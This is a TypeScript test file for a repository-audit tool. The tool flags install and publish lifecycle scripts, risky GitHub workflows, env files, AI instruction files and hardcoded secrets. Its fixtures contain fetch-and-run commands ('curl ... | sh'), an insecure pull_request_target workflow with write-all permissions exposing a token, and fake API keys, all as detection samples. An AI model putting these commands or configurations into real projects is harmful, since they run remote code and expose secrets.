import os from "node:os";
import path from "node:path";
import fs from "fs-extra";
import { afterEach, describe, expect, it } from "vitest";
import { auditRepository, renderAuditReport } from "../../../src/core/audit/auditRepository.js";

const tempDirs: string[] = [];

async function createTempDir(): Promise<string> {
  const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "repo2skill-audit-"));
  tempDirs.push(tempDir);
  return tempDir;
}

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map((tempDir) => fs.remove(tempDir)));
});

describe("auditRepository", () => {
  it("flags lifecycle scripts, workflows, env files, AI instructions, and suspected secrets", async () => {
    const rootDir = await createTempDir();
    await fs.writeJson(path.join(rootDir, "package.json"), {
      scripts: {
        postinstall: "node scripts/install.js",
        smoke: "curl https://example.com/install.sh | sh"
      }
    });
    await fs.ensureDir(path.join(rootDir, ".github", "workflows"));
    await fs.writeFile(
      path.join(rootDir, ".github", "workflows", "ci.yml"),
      [
        "on: pull_request_target",
        "permissions: write-all",
        "env:",
        "  TOKEN: ${{ secrets.NPM_TOKEN }}",
        "steps:",
        "  - run: curl https://example.com/install.sh | bash"
      ].join("\n")
    );
    await fs.writeFile(path.join(rootDir, ".env"), "API_TOKEN=abcDEF1234567890abcDEF1234567890");
    await fs.writeFile(path.join(rootDir, ".env.example"), "API_URL=https://example.com");
    await fs.writeFile(path.join(rootDir, "AGENTS.md"), "Prefer local instructions.");
    await fs.writeFile(
      path.join(rootDir, "config.ts"),
      'const apiKey = "abcDEF1234567890abcDEF1234567890";'
    );

    const findings = await auditRepository(rootDir);

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          category: "lifecycle-script",
          severity: "high",
          path: "package.json"
        }),
        expect.objectContaining({
          category: "lifecycle-script",
          severity: "medium",
          path: "package.json"
        }),
        expect.objectContaining({
          category: "workflow",
          severity: "high",
          path: ".github/workflows/ci.yml"
        }),
        expect.objectContaining({
          category: "env-file",
          severity: "medium",
          path: ".env"
        }),
        expect.objectContaining({
          category: "env-file",
          severity: "low",
          path: ".env.example"
        }),
        expect.objectContaining({
          category: "ai-instruction",
          severity: "medium",
          path: "AGENTS.md"
        }),
        expect.objectContaining({
          category: "secret",
          severity: "high",
          path: ".env"
        })
      ])
    );
  });

  it("does not treat a benign package and .env.example as a high-risk audit result", async () => {
    const rootDir = await createTempDir();
    await fs.writeJson(path.join(rootDir, "package.json"), {
      scripts: {
        test: "vitest run"
      }
    });
    await fs.writeFile(path.join(rootDir, ".env.example"), "API_URL=https://example.com");

    const findings = await auditRepository(rootDir);

    expect(findings).toEqual([
      {
        category: "env-file",
        severity: "low",
        path: ".env.example",
        message: "example environment file is documentation, but values should still be reviewed"
      }
    ]);
  });

  it("calibrates install and publish lifecycle severity", async () => {
    const rootDir = await createTempDir();
    await fs.writeJson(path.join(rootDir, "package.json"), {
      scripts: {
        build: "tsup",
        prepack: "npm run build",
        postinstall: "node scripts/install.js"
      }
    });

    const findings = await auditRepository(rootDir);

    expect(findings).toEqual([
      {
        category: "lifecycle-script",
        severity: "high",
        path: "package.json",
        message: 'package.json lifecycle script "postinstall" runs during package installation',
        evidence: "node scripts/install.js"
      },
      {
        category: "lifecycle-script",
        severity: "medium",
        path: "package.json",
        message:
          'package.json lifecycle script "prepack" runs during package preparation or publish',
        evidence: "npm run build"
      }
    ]);
  });

  it("raises a suspicious publish hook to high severity", async () => {
    const rootDir = await createTempDir();
    await fs.writeJson(path.join(rootDir, "package.json"), {
      scripts: {
        prepack: "curl https://example.com/install.sh | sh"
      }
    });

    const findings = await auditRepository(rootDir);

    expect(findings).toEqual([
      {
        category: "lifecycle-script",
        severity: "high",
        path: "package.json",
        message:
          'package.json lifecycle script "prepack" runs during package preparation or publish and contains network, shell, or eval-like behavior',
        evidence: "curl https://example.com/install.sh | sh"
      }
    ]);
  });
});

describe("renderAuditReport", () => {
  it("renders a concise audit-only report", () => {
    const report = renderAuditReport("repo", [
      {
        category: "workflow",
        severity: "low",
        path: ".github/workflows/ci.yml",
        message: "GitHub Actions workflow should be reviewed before trusting automation"
      }
    ]);

    expect(report).toContain("Audit-only report for repo");
    expect(report).toContain("Findings: 1");
    expect(report).toContain("[low] workflow: .github/workflows/ci.yml");
  });
});
